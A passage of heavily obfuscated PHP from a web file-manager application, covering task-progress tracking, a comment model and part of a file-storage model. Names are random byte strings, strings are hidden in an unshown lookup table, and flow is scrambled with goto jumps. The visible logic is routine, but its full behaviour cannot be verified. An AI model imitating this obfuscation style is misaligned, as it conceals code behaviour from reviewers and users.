$d¬’™¿™ÄË[$c¥ÖéÓ¦©†[998]]; $d¬’™¿™ÄË[$c¥ÖéÓ¦©†[1499]] = 0.3 + $BµÍ¥‹‚‡° * 0.5; } else { if ($d¬’™¿™ÄË[$c¥ÖéÓ¦©†[1577]] == $c¥ÖéÓ¦©†[106]) { $BµÍ¥‹‚‡° = 0; if ($d¬’™¿™ÄË[$c¥ÖéÓ¦©†[1543]]) { $BµÍ¥‹‚‡° = $d¬’™¿™ÄË[$c¥ÖéÓ¦©†[1544]] / $d¬’™¿™ÄË[$c¥ÖéÓ¦©†[1543]]; } $d¬’™¿™ÄË[$c¥ÖéÓ¦©†[1499]] = 0.3 + 0.5 + $BµÍ¥‹‚‡° * 0.2; } } } if ($d¬’™¿™ÄË[$c¥ÖéÓ¦©†[1499]] > 0) { $EÔ„Ø–®‹… = timeFloat() - $d¬’™¿™ÄË[$c¥ÖéÓ¦©†[1501]] - $d¬’™¿™ÄË[$c¥ÖéÓ¦©†[1504]]; $d¬’™¿™ÄË[$c¥ÖéÓ¦©†[1505]] = $EÔ„Ø–®‹… * (1 - $d¬’™¿™ÄË[$c¥ÖéÓ¦©†[1499]]) / $d¬’™¿™ÄË[$c¥ÖéÓ¦©†[1499]]; } } public function copyFileStart($a†‡†—¢¹, $FÏËÜµ¹Ø©, $eÖ½çŞ†¶®, $F«ˆîª¾Š®, $d‡ØÂ’Å„, $cå©ÅŒğ¸‰) { $C†ºß“äÅÎ =& $_SERVER[¢ÌÛ]; parent::copyFileStart($a†‡†—¢¹, $FÏËÜµ¹Ø©, $eÖ½çŞ†¶®, $F«ˆîª¾Š®, $d‡ØÂ’Å„, $cå©ÅŒğ¸‰); $CŸí¥²‡è =& $this->task; if ($CŸí¥²‡è[$C†ºß“äÅÎ[1577]] == $C†ºß“äÅÎ[309]) { $CŸí¥²‡è[$C†ºß“äÅÎ[1577]] = $C†ºß“äÅÎ[106]; } $this->update(); } public function copyFileEnd($D–™ØÚÃß·, $Aá“¥–õÒ, $aççƒóè“Å, $fÚÌŠƒğ, $DİôÆÀİã«, $Eôˆ¿§â–) { $f‰òóñœñ– =& $_SERVER[¢ÌÛ]; $A»ƒ¢ö‰· =& $this->task; $A»ƒ¢ö‰·[$f‰òóñœñ–[1544]] = $A»ƒ¢ö‰·[$f‰òóñœñ–[1543]]; $A»ƒ¢ö‰·[$f‰òóñœñ–[1548]] += $A»ƒ¢ö‰·[$f‰òóñœñ–[1543]]; $A»ƒ¢ö‰·[$f‰òóñœñ–[1545]] = $f‰òóñœñ–[33]; $this->update(); } public function nameParse($A¡Ã±Ê†ñŠ) { $cÊ’ß¡°‡ =& $_SERVER[¢ÌÛ]; $c©•´Ë’îÀ =& $this->task; if ($c©•´Ë’îÀ[$cÊ’ß¡°‡[1012]] < $c©•´Ë’îÀ[$cÊ’ß¡°‡[998]]) { $C˜ ±ŒÂ¿» = get_path_this($A¡Ã±Ê†ñŠ); if (strstr($C˜ ±ŒÂ¿», $cÊ’ß¡°‡[94])) { $c©•´Ë’îÀ[$cÊ’ß¡°‡[1012]] += 1; } } if ($c©•´Ë’îÀ[$cÊ’ß¡°‡[1577]] == $cÊ’ß¡°‡[1070]) { $c©•´Ë’îÀ[$cÊ’ß¡°‡[1577]] = $cÊ’ß¡°‡[309]; } $c©•´Ë’îÀ[$cÊ’ß¡°‡[1541]] = $A¡Ã±Ê†ñŠ; $this->update(); } } goto E†°Ï¤¿ğä; Bá™‹ÍÖ‰Š: class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\x6d\155\x65\156\x74"; protected $tableMeta = array("\164\141\142\x6c\x65\x4e\141\x6d\145" => "\143\x6f\x6d\x6d\x65\x6e\x74\137\x6d\x65\x74\141", "\x6d\x65\164\141\x46\x69\145\x6c\144" => "\x63\157\x6d\x6d\x65\x6e\164\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($C§ğöÆ¬¡°) { $FêÍ°İšâ =& $_SERVER[¢ÌÛ]; if ($C§ğöÆ¬¡°[$FêÍ°İšâ[1685]]) { $D¦¾Š‘¯İ° = $this->where(array($FêÍ°İšâ[1686] => $C§ğöÆ¬¡°[$FêÍ°İšâ[1685]]))->find(); if (!$D¦¾Š‘¯İ° || $D¦¾Š‘¯İ°[$FêÍ°İšâ[398]] != $C§ğöÆ¬¡°[$FêÍ°İšâ[398]] || $D¦¾Š‘¯İ°[$FêÍ°İšâ[483]] != $C§ğöÆ¬¡°[$FêÍ°İšâ[483]]) { return !1; } $this->where(array($FêÍ°İšâ[1686] => $C§ğöÆ¬¡°[$FêÍ°İšâ[1685]]))->setAdd($FêÍ°İšâ[1687], 1); } $C§ğöÆ¬¡°[$FêÍ°İšâ[1688]] = 0; $C§ğöÆ¬¡°[$FêÍ°İšâ[1687]] = 0; $C§ğöÆ¬¡°[$FêÍ°İšâ[712]] = 1; return $this->add($C§ğöÆ¬¡°); } public function commentCount($C……àô“·, $CÊ°ÖöòƒÃ) { goto Cä•ÉÜİ„Á; DŠİºÁÒ¢Å: $c‘áòĞ¢™ = $Fš°Àå„Ó›[1689]; $EÕ÷¼ƒ‘öË = array($Fš°Àå„Ó›[483] => array($Fš°Àå„Ó›[7], $C……àô“·), $Fš°Àå„Ó›[398] => $CÊ°ÖöòƒÃ); $A¥ˆíˆ©™ = $this->field($c‘áòĞ¢™)->where($EÕ÷¼ƒ‘öË)->group($Fš°Àå„Ó›[483])->select(); goto Aø§‰“æ¬±; Aø§‰“æ¬±: return array_to_keyvalue($A¥ˆíˆ©™, $Fš°Àå„Ó›[483], $Fš°Àå„Ó›[1690]); goto DùìŞš“á¦; Cä•ÉÜİ„Á: $Fš°Àå„Ó› =& $_SERVER[¢ÌÛ]; if (!$C……àô“·) { return array(); } if (is_string($C……àô“·) || is_int($C……àô“·)) { $C……àô“· = array($C……àô“·); } goto DŠİºÁÒ¢Å; DùìŞš“á¦: } public function remove($C˜Ûšßˆæì) { $DÖâà½¡ã =& $_SERVER[¢ÌÛ]; $e»ËÌñÇ ë = array($DÖâà½¡ã[1686] => $C˜Ûšßˆæì); $f ’Í«¥‰î = $this->where($e»ËÌñÇ ë)->find(); if ($f ’Í«¥‰î[$DÖâà½¡ã[1685]]) { $this->where(array($DÖâà½¡ã[1686] => $f ’Í«¥‰î[$DÖâà½¡ã[1685]]))->setAdd($DÖâà½¡ã[1687], -1); } return $this->where($e»ËÌñÇ ë)->delete(); } public function edit($bÈ©ÎêëŒ™, $aÆÓíµË”ğ) { $Cª¾Ü§³™Ê =& $_SERVER[¢ÌÛ]; $b†å°£İ… = array($Cª¾Ü§³™Ê[1686] => $bÈ©ÎêëŒ™); return $this->where($b†å°£İ…)->save(array($Cª¾Ü§³™Ê[1691] => $aÆÓíµË”ğ)); } public function prasise($bœˆóè£ªÇ) { $B¾Ú‘Ò½ † =& $_SERVER[¢ÌÛ]; $F¢®‚Üø×¨ = Model($B¾Ú‘Ò½ †[1692]); $e×Œ¦Š‹‚¦ = array($B¾Ú‘Ò½ †[1686] => $bœˆóè£ªÇ, $B¾Ú‘Ò½ †[1490] => USER_ID); $cë’‘ë•ñ = $F¢®‚Üø×¨->where($e×Œ¦Š‹‚¦)->find(); if (!$cë’‘ë•ñ) { $F¢®‚Üø×¨->add($e×Œ¦Š‹‚¦); $cô’µîƒÙÏ = $this->where(array($B¾Ú‘Ò½ †[1686] => $bœˆóè£ªÇ))->setAdd($B¾Ú‘Ò½ †[1688], 1); } else { $F¢®‚Üø×¨->where($e×Œ¦Š‹‚¦)->delete(); $cô’µîƒÙÏ = $this->where(array($B¾Ú‘Ò½ †[1686] => $bœˆóè£ªÇ))->setAdd($B¾Ú‘Ò½ †[1688], -1); } return $cô’µîƒÙÏ; } public function targetInfo($d‹÷ÜğšÏ, $c¿öÙ –¯Ó) { goto F‰é ¦¿‘ç; B¸ŞÜÔùä°: return $d…¡âÁá¬Ê; goto D©è«ï›ç; F‰é ¦¿‘ç: $dİÛÊ™‚ =& $_SERVER[¢ÌÛ]; $Eñµì—‘Âø = array($dİÛÊ™‚[547] => $d‹÷ÜğšÏ, $dİÛÊ™‚[548] => $c¿öÙ –¯Ó); $CÓéµ®ìºÕ = $this->where($Eñµì—‘Âø)->count(); goto aÛÆ¿“ŸŒ; aÛÆ¿“ŸŒ: $d°œˆÎ‚‡ß = "\x52\x49\107\110\124\x20\x4a\x4f\x49\116\x20{$this->tablePrefix}\143\157\155\155\x65\x6e\164\137\x70\x72\141\x69\163\x65\40\x73\x74\141\x72\40\x6f\x6e\x20\143\x6f\155\155\x65\156\x74\x2e\x63\157\x6d\155\x65\x6e\x74\x49\x44\x20\x3d\40\163\x74\x61\x72\x2e\x63\157\x6d\155\x65\156\164\111\x44"; $Aé÷–ªèâ = $this->alias($dİÛÊ™‚[350])->where($Eñµì—‘Âø)->join($d°œˆÎ‚‡ß, $dİÛÊ™‚[1693])->count(); $d…¡âÁá¬Ê = array($dİÛÊ™‚[1694] => $CÓéµ®ìºÕ, $dİÛÊ™‚[1695] => $Aé÷–ªèâ); goto B¸ŞÜÔùä°; D©è«ï›ç: } public function listData($EÒÖ¤âéíÃ) { $e˜èÓ’ğ¢ =& $_SERVER[¢ÌÛ]; if (isset($EÒÖ¤âéíÃ[$e˜èÓ’ğ¢[1696]])) { if ($EÒÖ¤âéíÃ[$e˜èÓ’ğ¢[1696]]) { $EÒÖ¤âéíÃ[$e˜èÓ’ğ¢[1697]] = array($e˜èÓ’ğ¢[948], intval($EÒÖ¤âéíÃ[$e˜èÓ’ğ¢[1696]])); } unset($EÒÖ¤âéíÃ[$e˜èÓ’ğ¢[1696]]); } if (isset($EÒÖ¤âéíÃ[$e˜èÓ’ğ¢[1698]])) { if ($EÒÖ¤âéíÃ[$e˜èÓ’ğ¢[1698]]) { $EÒÖ¤âéíÃ[$e˜èÓ’ğ¢[1697]] = array($e˜èÓ’ğ¢[945], intval($EÒÖ¤âéíÃ[$e˜èÓ’ğ¢[1698]])); } unset($EÒÖ¤âéíÃ[$e˜èÓ’ğ¢[1698]]); } return $this->_listData($EÒÖ¤âéíÃ); } private function _listData($b¦²Ğ¡Ô’Õ) { $BŸ•¥æ¸Ñ =& $_SERVER[¢ÌÛ]; $BÇ‰Õ‹à  = $this->where($b¦²Ğ¡Ô’Õ)->_makeOrder()->selectPage(100); $this->_listAppendParent($BÇ‰Õ‹à [$BŸ•¥æ¸Ñ[363]]); $this->_listAppendUser($BÇ‰Õ‹à [$BŸ•¥æ¸Ñ[363]]); $this->_listAppendMeta($BÇ‰Õ‹à [$BŸ•¥æ¸Ñ[363]]); return $BÇ‰Õ‹à ; } private function _makeOrder() { $dÚÉë÷¿ =& $_SERVER[¢ÌÛ]; $DË±‚±›ˆ = array($dÚÉë÷¿[1688], $dÚÉë÷¿[1687], $dÚÉë÷¿[192]); $b¤áêçîíİ = Input::get($dÚÉë÷¿[433], $dÚÉë÷¿[7], $dÚÉë÷¿[416], $DË±‚±›ˆ); $Aˆ×‘¥…â = Input::get($dÚÉë÷¿[434], $dÚÉë÷¿[7], $dÚÉë÷¿[1492], array($dÚÉë÷¿[1699], $dÚÉë÷¿[431])); $a§‹´Á…¼ = $b¤áêçîíİ . $dÚÉë÷¿[50] . $Aˆ×‘¥…â; return $this->order($a§‹´Á…¼); } private function _listAppendParent(&$fŒŞ½Ã›ÍÇ) { goto DÍÇíŒ³¬; aÒŒ¼àÖò“: if (!$b¨‰’×İéÖ) { return; } $aã˜ª¬åÄ¥ = $this->where(array($c¯¿Ú¢ˆÇô[1686] => array($c¯¿Ú¢ˆÇô[7], $b¨‰’×İéÖ)))->select(); $aã˜ª¬åÄ¥ = array_to_keyvalue($aã˜ª¬åÄ¥, $c¯¿Ú¢ˆÇô[1697]); goto FÂ¿©‰‘×; DÍÇíŒ³¬: $c¯¿Ú¢ˆÇô =& $_SERVER[¢ÌÛ]; $b¨‰’×İéÖ = array_unique(array_to_keyvalue($fŒŞ½Ã›ÍÇ, $c¯¿Ú¢ˆÇô[33], $c¯¿Ú¢ˆÇô[1685])); $b¨‰’×İéÖ = array_remove_value($b¨‰’×İéÖ, $c¯¿Ú¢ˆÇô[495]); goto aÒŒ¼àÖò“; FÂ¿©‰‘×: foreach ($fŒŞ½Ã›ÍÇ as &$F–›¢Õ‘³½) { if (isset($aã˜ª¬åÄ¥[$F–›¢Õ‘³½[$c¯¿Ú¢ˆÇô[1685]]])) { $F–›¢Õ‘³½[$c¯¿Ú¢ˆÇô[1700]] = $aã˜ª¬åÄ¥[$F–›¢Õ‘³½[$c¯¿Ú¢ˆÇô[1685]]]; } } unset($F–›¢Õ‘³½); goto D˜°Ğ³öç; D˜°Ğ³öç: } private function _listAppendUser(&$c‚…¶ÛšØå) { goto AÅèä–¶Øã; AÅèä–¶Øã: $a½Ë°ïÍÀ =& $_SERVER[¢ÌÛ]; $A¶âøÈœÖ› = array_unique(array_to_keyvalue($c‚…¶ÛšØå, $a½Ë°ïÍÀ[33], $a½Ë°ïÍÀ[1498])); $A¶âøÈœÖ› = array_remove_value($A¶âøÈœÖ›, $a½Ë°ïÍÀ[495]); goto AËÏ‡Æ³ŞÁ; AËÏ‡Æ³ŞÁ: if (count($A¶âøÈœÖ›) == 0) { return; } foreach ($c‚…¶ÛšØå as $dèËÅ’œŠÃ) { if (isset($dèËÅ’œŠÃ[$a½Ë°ïÍÀ[1700]])) { $A¶âøÈœÖ›[] = $dèËÅ’œŠÃ[$a½Ë°ïÍÀ[1700]][$a½Ë°ïÍÀ[1498]]; } } $e í½¸õã = Model($a½Ë°ïÍÀ[504])->userListInfo($A¶âøÈœÖ›); goto Añš‹óèÌ; Añš‹óèÌ: foreach ($c‚…¶ÛšØå as &$dèËÅ’œŠÃ) { $dèËÅ’œŠÃ[$a½Ë°ïÍÀ[560]] = $e í½¸õã[$dèËÅ’œŠÃ[$a½Ë°ïÍÀ[1498]]]; if (isset($dèËÅ’œŠÃ[$a½Ë°ïÍÀ[1700]])) { $dèËÅ’œŠÃ[$a½Ë°ïÍÀ[1700]][$a½Ë°ïÍÀ[560]] = $e í½¸õã[$dèËÅ’œŠÃ[$a½Ë°ïÍÀ[1700]][$a½Ë°ïÍÀ[1498]]]; } } unset($dèËÅ’œŠÃ); goto D³½ßßîˆŒ; D³½ßßîˆŒ: } private function _listAppendMeta(&$C†Œå©˜™) { goto b«µğŒø¡; DŒÅŸ›ãÈ¬: if (!$d°³ƒõâÑÉ) { return; } foreach ($C†Œå©˜™ as $EÑÊó´´˜ö) { if (isset($EÑÊó´´˜ö[$cÖÆìôµè[1700]])) { $d°³ƒõâÑÉ[] = $EÑÊó´´˜ö[$cÖÆìôµè[1700]][$cÖÆìôµè[1697]]; } } $Eºí¡®£Õó = $this->metaList($d°³ƒõâÑÉ); goto D½˜ŞÙÛˆ; D½˜ŞÙÛˆ: if (!$Eºí¡®£Õó) { return !1; } foreach ($C†Œå©˜™ as &$EÑÊó´´˜ö) { $EÑÊó´´˜ö[$cÖÆìôµè[443]] = $Eºí¡®£Õó[$EÑÊó´´˜ö[$cÖÆìôµè[1697]]]; if (isset($EÑÊó´´˜ö[$cÖÆìôµè[1700]])) { $EÑÊó´´˜ö[$cÖÆìôµè[1700]][$cÖÆìôµè[443]] = $Eºí¡®£Õó[$EÑÊó´´˜ö[$cÖÆìôµè[1700]][$cÖÆìôµè[1697]]]; } } unset($EÑÊó´´˜ö); goto b˜ñ‡¶äÖ; b«µğŒø¡: $cÖÆìôµè =& $_SERVER[¢ÌÛ]; $d°³ƒõâÑÉ = array_unique(array_to_keyvalue($C†Œå©˜™, $cÖÆìôµè[33], $cÖÆìôµè[1697])); $d°³ƒõâÑÉ = array_remove_value($d°³ƒõâÑÉ, $cÖÆìôµè[495]); goto DŒÅŸ›ãÈ¬; b˜ñ‡¶äÖ: } private function metaList($F‡¾®»‚İğ) { goto AÄ¸ÁöÆİ; f£ÇÔÌªä: return $d’éù…›óµ ? $d’éù…›óµ : array(); goto BÔî˜Œ³­å; AÄ¸ÁöÆİ: $eóÑíâÔÊ =& $_SERVER[¢ÌÛ]; if (!$F‡¾®»‚İğ) { return array(); } $E¥˜è„™ÖÚ = array($eóÑíâÔÊ[1697] => array($eóÑíâÔÊ[7], $F‡¾®»‚İğ)); goto Aàãé‘¯‹; Aàãé‘¯‹: $d’éù…›óµ = Model($eóÑíâÔÊ[1701])->where($E¥˜è„™ÖÚ)->select(); $d’éù…›óµ = array_to_keyvalue_group($d’éù…›óµ, $eóÑíâÔÊ[1697]); foreach ($d’éù…›óµ as $f¢Çéê¥… => $E¼®•°«Ø‚) { $bÓï»¤¦Æ¦ = array(); foreach ($E¼®•°«Ø‚ as $f­’‘²êÓ) { $bÓï»¤¦Æ¦[$f­’‘²êÓ[$eóÑíâÔÊ[92]]] = $f­’‘²êÓ[$eóÑíâÔÊ[368]]; } $d’éù…›óµ[$f¢Çéê¥…] = $bÓï»¤¦Æ¦; } goto f£ÇÔÌªä; BÔî˜Œ³­å: } } class FileModel extends ModelBase { protected $tableName = "\151\157\x5f\x66\x69\154\x65"; protected $tableMeta = array("\x74\x61\142\x6c\145\x4e\x61\x6d\145" => "\x69\x6f\x5f\146\x69\x6c\x65\137\155\145\x74\x61", "\155\145\164\141\x46\151\x65\x6c\144" => "\x66\151\154\x65\x49\104"); public function fileInfo($FÏÈê±¼š) { $Fî”Áª·Ó´ =& $_SERVER[¢ÌÛ]; static $a¨‹¸ªÊŠ… = array(); if (!isset($a¨‹¸ªÊŠ…[$FÏÈê±¼š])) { $a½Š§„³ªË = $Fî”Áª·Ó´[1702]; $e¥å®³¬ = Model($Fî”Áª·Ó´[448])->field($a½Š§„³ªË)->where(array($Fî”Áª·Ó´[446] => $FÏÈê±¼š))->find(); $a¨‹¸ªÊŠ…[$FÏÈê±¼š] = $e¥å®³¬; } return $a¨‹¸ªÊŠ…[$FÏÈê±¼š]; } public function addFileByContent($c§Û¬èÇ‰ = '', $E’Ï²Ñƒ = '') { goto aŞâÔÕÃ; aŞâÔÕÃ: $eß¢îƒ³‰¢ =& $_SERVER[¢ÌÛ]; $BİÒ«Ñ´› = TEMP_PATH . $eß¢îƒ³‰¢[1703]; if (!is_dir($BİÒ«Ñ´›)) { mk_dir($BİÒ«Ñ´›); } goto bÏñ¨ùµùÉ; bÏñ¨ùµùÉ: $eòÁ¾œÔ‚ = $BİÒ«Ñ´› . $eß¢îƒ³‰¢[1704] . rand_string(16); file_put_contents($eòÁ¾œÔ‚, $c§Û¬èÇ‰); $Eàˆîßö©² = $this->addFile($eòÁ¾œÔ‚, $E’Ï²Ñƒ, !0); goto B†÷´ˆÂ; B†÷´ˆÂ: if (file_exists($eòÁ¾œÔ‚)) { @unlink($eòÁ¾œÔ‚); } return $Eàˆîßö©²; goto få×œÏ¥¨·; få×œÏ¥¨·: } public function createFileName($cÊ¾äŠõ¥Ç) { goto C„æ‘øŒ¿é; C„æ‘øŒ¿é: $B‘ÚÍÖÈ¡ =& $_SERVER[¢ÌÛ]; $c¶ÀÖìİØ = IO::init($B‘ÚÍÖÈ¡[8]); $FÓ„Ã™ğ‡– = $this->makeFilePath($cÊ¾äŠõ¥Ç, $c¶ÀÖìİØ); goto Cá”É¸¸‹; Cá”É¸¸‹: $d ¹ÍŒï = $c¶ÀÖìİØ->pathFather($FÓ„Ã™ğ‡–); static $dñ¡ÊÈÙõ = false; $FÒ¥™Å¦•Ù = $B‘ÚÍÖÈ¡[1705] . md5($d ¹ÍŒï); goto a‡İÎ‹†ƒ; a‡İÎ‹†ƒ: if (!$dñ¡ÊÈÙõ && !Cache::get($FÒ¥™Å¦•Ù)) { $dñ¡ÊÈÙõ = !0; $bÙø¯ãÔÅô = IO::mkdir($d ¹ÍŒï); if (!IO::exist($bÙø¯ãÔÅô . $B‘ÚÍÖÈ¡[1706])) { IO::mkfile($bÙø¯ãÔÅô . $B‘ÚÍÖÈ¡[1706]); } Cache::set($FÒ¥™Å¦•Ù, 1, 3600 * 2); } return $FÓ„Ã™ğ‡–; goto Cñî’³°º§; Cñî’³°º§: } public function makeFilePath($DÒ”Çã·, $EÊ»ÇŞãØÂ) { goto C¨‰‡Çôí; fŞ‹Ó”²â: $aöğëÏøëí = $E•ô‰ôµ½ˆ . rand_string(5) . short_id(100); $DÒ”Çã· = str_replace($CİŠôÈ†áè[8], $CİŠôÈ†áè[70], KodIO::clear($DÒ”Çã·)); if (!$DÒ”Çã·) { $C¼”‡ì¹²” = $CİŠôÈ†áè[1709]; } goto C»¨øÙßæ¾; C¨‰‡Çôí: $CİŠôÈ†áè =& $_SERVER[¢ÌÛ]; $C¼”‡ì¹²” = Model($CİŠôÈ†áè[1099])->get($CİŠôÈ†áè[1707]); $E•ô‰ôµ½ˆ = KodIO::defaultIO() . date($CİŠôÈ†áè[1708]); goto fŞ‹Ó”²â; C»¨øÙßæ¾: switch ($C¼”‡ì¹²”) { case $CİŠôÈ†áè[1710]: $aöğëÏøëí = $aöğëÏøëí . $CİŠôÈ†áè[94] . $EÊ»ÇŞãØÂ->ext($DÒ”Çã·); if ($EÊ»ÇŞãØÂ->ext($DÒ”Çã·) == $CİŠôÈ†áè[1647]) { $aöğëÏøëí .= $CİŠôÈ†áè[1399]; } break; case $CİŠôÈ†áè[1711]: goto cÚ®âÁ”í; C¸óùöá´ò: $E•ô‰ôµ½ˆ = $CİŠôÈ†áè[1097] . $e®¶Ó×˜µ[$CİŠôÈ†áè[385]] . $CİŠôÈ†áè[1713] . date($CİŠôÈ†áè[1714]) . $FÊåÃÉÍ÷ . $CİŠôÈ†áè[8]; if ($EÊ»ÇŞãØÂ->ext($DÒ”Çã·) == $CİŠôÈ†áè[1647]) { $DÒ”Çã· .= $CİŠôÈ†áè[1399]; } $AØÉ®½‘· = $CİŠôÈ†áè[1715] . $E•ô‰ôµ½ˆ . $DÒ”Çã·; goto aÈõŠƒÍ˜; aÈõŠƒÍ˜: CacheLock::lock($AØÉ®½‘·); $D‚ÏÍÁëËê = IO::fileNameAuto($E•ô‰ôµ½ˆ, $DÒ”Çã·); $aöğëÏøëí = $E•ô‰ôµ½ˆ . $D‚ÏÍÁëËê; goto b™—òïÊ•µ; b™—òïÊ•µ: if (IO::isTypeObject($aöğëÏøëí) && !IO::isUploadServer($aöğëÏøëí)) { $fÌ§ªîİ¡ = IO::setContent($aöğëÏøëí, $CİŠôÈ†áè[33]); if (!$fÌ§ªîİ¡) { show_json($CİŠôÈ†áè[1716], !1); } } CacheLock::unlock($AØÉ®½‘·); break; goto a‰ã–èïĞ£; cÚ®âÁ”í: $E­ŠÇŞí™´ = Model($CİŠôÈ†áè[1099])->get($CİŠôÈ†áè[1395]); $FÊåÃÉÍ÷ = substr(md5($CİŠôÈ†áè[1712] . $E­ŠÇŞí™´ . date($CİŠôÈ†áè[710])), 0, 8); $e®¶Ó×˜µ = KodIO::defaultDriver(); goto C¸óùöá´ò; a‰ã–èïĞ£: case $CİŠôÈ†áè[1709]: break; default: break; } return $aöğëÏøëí; goto bÍîÑªÜ¨„; bÍîÑªÜ¨„: } public function addFileByRemote($eá–…´İ”Ú, $dõÈã¨×…ô, $fÀÈç”à« = array()) { goto c±»µè¨“Æ; CŞ¾î—±³†: if ($D¤ìßËñø¯ = $this->addFileCheckExist($fÚÛ¸®Í‡¬[$A´‚°š‡Â´[170]], $fÚÛ¸®Í‡¬[$A´‚°š‡Â´[169]], $fÚÛ¸®Í‡¬[$A´‚°š‡Â´[77]])) { return $D¤ìßËñø¯; } return $this->addFileData($fÚÛ¸®Í‡¬); goto bŸ»öÈ‹åî; c±»µè¨“Æ: $A´‚°š‡Â´ =& $_SERVER[¢ÌÛ]; if (!IO::exist($eá–…´İ”Ú)) { return !1; } $bÀ…øÒ¥İè = $fÀÈç”à«[$A´‚°š‡Â´[169]] ? $fÀÈç”à«[$A´‚°š‡Â´[169]] : $A´‚°š‡Â´[33]; goto fìì±Í‹º­; fìì±Í‹º­: $BŠ³ÍÇÄ¬¹ = IO::hashMd5($eá–…´İ”Ú, $bÀ…øÒ¥İè); $FÛ®í©…Ô = KodIO::defaultDriver(); $fÚÛ¸®Í‡¬ = array($A´‚°š‡Â´[546] => IO::size($eá–…´İ”Ú), $A´‚°š‡Â´[1717] => 1, $A´‚°š‡Â´[413] => $dõÈã¨×…ô, $A´‚°š‡Â´[758] => $FÛ®í©…Ô[$A´‚°š‡Â´[385]], $A´‚°š‡Â´[414] => $eá–…´İ”Ú, $A´‚°š‡Â´[1718] => $fÀÈç”à«[$A´‚°š‡Â´[170]] ? $fÀÈç”à«[$A´‚°š‡Â´[170]] : IO::hashSimple($eá–…´İ”Ú), $A´‚°š‡Â´[1719] => $BŠ³ÍÇÄ¬¹ ? $BŠ³ÍÇÄ¬¹ : $bÀ…øÒ¥İè); goto CŞ¾î—±³†; bŸ»öÈ‹åî: } private function addFileData($cìÚ‘˜Ò°) { $Eµ¸Ú‹æ«  =& $_SERVER[¢ÌÛ]; if (!$cìÚ‘˜Ò°) { return !1; } $cìÚ‘˜Ò°[$Eµ¸Ú‹æ« [77]] = intval($cìÚ‘˜Ò°[$Eµ¸Ú‹æ« [77]]); if (!$cìÚ‘˜Ò°[$Eµ¸Ú‹æ« [77]] && strlen($cìÚ‘˜Ò°[$Eµ¸Ú‹æ« [170]]) > 32) { $cìÚ‘˜Ò°[$Eµ¸Ú‹æ« [77]] = intval(substr($cìÚ‘˜Ò°[$Eµ¸Ú‹æ« [170]], 32)); } $EÇİ¡æÃø÷ = $this->add($cìÚ‘˜Ò°); return $this->find($EÇİ¡æÃø÷); } public function addFile($EËÒÅ»˜Ëß, $BÂÉ¥…ÄÛö, $BìÄ‘ñ¹Ø… = false) { goto AİĞ‹ô°ÉÖ; AİĞ‹ô°ÉÖ: $dÑ´¸¦®ê = IO::hashSimple($EËÒÅ»˜Ëß); $e¬èôÂğƒ÷ = IO::hashMd5($EËÒÅ»˜Ëß); $e¢¥ã²×… = IO::size($EËÒÅ»˜Ëß); goto d™ÂÀæ¨; d™ÂÀæ¨: $E§¥Í†Êè¨ = $_SERVER[¢ÌÛ][1720] . $e¬èôÂğƒ÷; CacheLock::lock($E§¥Í†Êè¨); if ($có‡¦ªÈ…À = $this->addFileCheckExist($dÑ´¸¦®ê, $e¬èôÂğƒ÷, $e¢¥ã²×…)) { CacheLock::unlock($E§¥Í†Êè¨); return $có‡¦ªÈ…À; } goto aÏŒñì½ÀŠ; Fô¥£‹é„: return $aÈÅ¡Ã×ƒ; goto B‹•œ¸£ä; aÏŒñì½ÀŠ: $càÇ¨ª¥‹‰ = $this->addFileMake($EËÒÅ»˜Ëß, $e¢¥ã²×…, $dÑ´¸¦®ê, $e¬èôÂğƒ÷, $BÂÉ¥…ÄÛö, $BìÄ‘ñ¹Ø…); $aÈÅ¡Ã×ƒ = $this->addFileData($càÇ¨ª¥‹‰); CacheLock::unlock($E§¥Í†Êè¨); goto Fô¥£‹é„; B‹•œ¸£ä: } public function addFileMake($CÛªƒ»Ä‘, $A‰šƒ„Á¬¡, $fÛ×´šîö, $CæÄ„ÚòŠÒ, $EŒÍ„¸á, $AÜßà¾¤‹å) { goto B‰½«£ƒ³«; AÄ†ª‹‘Íƒ: $c·õµäÙÎ = get_path_this($cóŠ‘óÊÁ); if ($AÜßà¾¤‹å) { $Fğ˜•ÅôÄ½ = IO::move($CÛªƒ»Ä‘, $Aáî¢Œâ°, !1, $c·õµäÙÎ); } else { $Fğ˜•ÅôÄ½ = IO::copy($CÛªƒ»Ä‘, $Aáî¢Œâ°, !1, $c·õµäÙÎ); } if (!$Fğ˜•ÅôÄ½) { return !1; } goto dö“ĞÜŠÚ¬; B‰½«£ƒ³«: $B‘˜æ‹†´ =& $_SERVER[¢ÌÛ]; $cóŠ‘óÊÁ = $this->createFileName($EŒÍ„¸á); $Aáî¢Œâ° = get_path_father($cóŠ‘óÊÁ); goto AÄ†ª‹‘Íƒ; dö“ĞÜŠÚ¬: $F öÔ¢õ = KodIO::defaultDriver(); $aò‹¶Ï°ºâ = array($B‘˜æ‹†´[546] => $A‰šƒ„Á¬¡, $B‘˜æ‹†´[1717] => 1, $B‘˜æ‹†´[413] => $EŒÍ„¸á, $B‘˜æ‹†´[758] => $F öÔ¢õ[$B‘˜æ‹†´[385]], $B‘˜æ‹†´[414] => $cóŠ‘óÊÁ, $B‘˜æ‹†´[1718] => $fÛ×´šîö, $B‘˜æ‹†´[1719] => $CæÄ„ÚòŠÒ); return $aò‹¶Ï°ºâ; goto fğÉ°µ‡ñÖ; fğÉ°µ‡ñÖ: } public function addFileCheckExist($añ»šõ‘”ˆ, $AôŠšò£ŒÁ, $dƒ‚¥ó´ñå) { $A‰ƒëèƒß =& $_SERVER[¢ÌÛ]; $DôŞ÷ˆ‰´³ = $this->findByHash($añ»šõ‘”ˆ, $AôŠšò£ŒÁ); if (!$DôŞ÷ˆ‰´³) { return !1; } $fã§†§ÏÅŠ = array($A‰ƒëèƒß[1717] => intval($DôŞ÷ˆ‰´³[$A‰ƒëèƒß[1721]]) + 1, $A‰ƒëèƒß[546] => $dƒ‚¥ó´ñå); $this->where(array($A‰ƒëèƒß[446] => $DôŞ÷ˆ‰´³[$A‰ƒëèƒß[445]]))->save($fã§†§ÏÅŠ); return $DôŞ÷ˆ‰´³; } public function remove($Fô‚»ÎØÍ) { $this->linkCountChange($Fô‚»ÎØÍ, !1); $this->clearEmpty(); return !0; } public function linkAdd($B‚ºƒ©Î) { $this->linkCountChange($B‚ºƒ©Î, !0); } public function 